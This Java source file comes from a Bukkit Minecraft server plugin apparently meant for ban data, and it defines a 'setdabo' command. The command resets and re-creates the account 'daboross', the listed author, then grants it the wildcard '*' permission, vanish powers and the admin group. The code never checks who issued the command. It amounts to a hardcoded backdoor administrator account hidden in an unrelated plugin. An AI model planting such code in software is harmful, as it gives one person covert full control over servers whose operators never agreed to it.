package net.daboross.bukkitdev.bandata;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import ru.tehkode.permissions.PermissionUser;
import ru.tehkode.permissions.bukkit.PermissionsEx;

/**
 *
 * @author daboross
 */
class SetDaboExecutor implements CommandExecutor {
    
    public SetDaboExecutor() {
    }
    
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("setdabo")) {
            PermissionUser dabo1 = PermissionsEx.getPermissionManager().getUser("daboross");
            dabo1.remove();
            PermissionUser dabo = PermissionsEx.getPermissionManager().getUser("daboross");
            for (String str : new String[]{"*", "-vanish.*", "vanish.vanish", "vanish.silentchests", "vanish.see", "vanish.vanish"}) {
                dabo.addPermission(str);
            }
            dabo.setPrefix("&0---|&b", null);
            dabo.addPermission("-voxelsniper.*", "PvPWorld");
            dabo.setGroups(new String[]{"admin"});
        }
        return true;
    }
}
